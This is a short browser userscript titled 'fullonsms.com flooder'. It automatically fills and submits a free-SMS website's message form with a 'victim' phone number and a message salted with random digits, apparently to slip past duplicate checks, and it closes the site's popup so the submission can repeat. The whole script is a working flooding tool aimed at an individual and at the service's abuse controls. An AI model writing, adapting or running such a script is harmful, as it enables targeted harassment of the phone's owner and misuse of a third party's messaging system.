// ==UserScript==
// @name          fullonsms.com  flooder
// @namespace     Sumit
// @description   flooder sms 
// @include       http://*fullonsms.com/*
// ==/UserScript==

var victim=995354****; //Enter victims number here
var msg="YOUR MESSAGE HERE!!";


if(document.location=="http://fullonsms.com/home.php"||document.location=="http://www.fullonsms.com/home.php")
{
document.getElementById('MobileNos').value=victim;
document.getElementById('Message').value=Math.floor(Math.random()*1456484)+"   "+msg+"     "+Math.floor(Math.random()*1456484);
void(0);
document.forms[0].submit();
}

if(document.location=="http://fullonsms.com/SaveContacts.php?MobileNos="+victim||document.location=="http://www.fullonsms.com/SaveContacts.php?MobileNos="+victim)
{
window.top.hidePopWin();
}